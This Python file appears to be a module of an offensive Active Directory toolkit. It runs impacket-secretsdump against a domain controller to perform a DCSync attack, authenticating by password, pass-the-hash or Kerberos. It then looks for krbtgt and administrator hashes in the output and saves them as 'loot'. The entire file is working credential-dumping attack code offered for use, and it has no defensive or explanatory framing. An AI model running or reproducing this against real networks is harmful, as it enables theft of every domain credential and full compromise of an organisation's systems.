# modules/dcsync.py

import shutil
from core.helpers import run_command, save_loot
from core.colors import red, green, blue, yellow

def attack_dcsync(session):
    print(blue(f"[*] Attempting DCSync using impacket-secretsdump against {session.dc_ip}..."))

    if not shutil.which("impacket-secretsdump"):
        print(red("[-] impacket-secretsdump not found in PATH. Please install Impacket."))
        return

    if session.hash:
        cmd = (
            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} "
            f"-hashes :{session.hash}"
        )
    elif session.password:
        cmd = (
            f"impacket-secretsdump {session.domain}/{session.username}:{session.password}@{session.dc_ip}"
        )
    else:
        cmd = (
            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} -k --no-pass"
        )

    out, err = run_command(cmd)
    combined = out + "\n" + err

    if any(term in combined.lower() for term in ["access denied", "error", "failed", "exception"]):
        print(red(f"[-] DCSync failed. Reason:\n{combined.strip()}"))
        return

    if not any(keyword in combined.lower() for keyword in ["krbtgt", "administrator", "$MACHINE.ACC"]):
        print(yellow("[!] DCSync ran but no high-value accounts found in output."))
        print(yellow("[!] You may still want to review the output manually."))
        print(combined)
        return

    print(green("[+] DCSync likely successful. Found sensitive accounts in output."))
    save_loot("dcsync_hashes.txt", combined)
    print(green("[+] Saved to loot/dcsync_hashes.txt"))
